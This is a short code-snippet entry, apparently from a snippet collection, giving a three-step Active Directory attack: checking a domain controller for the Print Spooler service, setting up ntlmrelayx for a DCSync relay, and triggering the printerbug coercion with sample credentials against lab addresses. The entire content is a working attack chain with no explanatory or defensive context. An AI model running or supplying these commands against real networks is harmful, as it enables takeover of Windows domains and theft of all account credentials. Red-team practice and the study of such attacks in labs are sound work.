---
id: 13626efd-8639-4681-816f-a054d39b6fe7
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:02.745227+00:00'
updated_at: '2023-04-10T20:36:02.529164+00:00'
---

# Code Snippet 13626efd

**Language**: Powershell

```powershell
# Check if one DC is running the PrintSpooler service
rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"

# Setup ntlmrelay in one shell
ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support

#Trigger printerbug in 2nd shell
python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
```


